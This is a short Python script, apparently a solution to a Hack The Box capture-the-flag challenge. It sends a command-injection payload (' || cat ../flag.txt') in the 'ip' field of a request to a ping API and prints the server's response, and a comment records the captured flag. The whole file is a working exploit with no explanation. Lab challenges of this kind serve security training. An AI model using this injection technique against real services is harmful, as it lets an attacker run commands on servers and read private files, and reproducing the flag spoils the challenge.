import requests

ip = "159.65.86.238:31037"
url = f'http://{ip}/api/ping'

data = {
    "ip":" || cat ../flag.txt"
}
res = requests.post(url,json=data)

print (res.text)

# HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}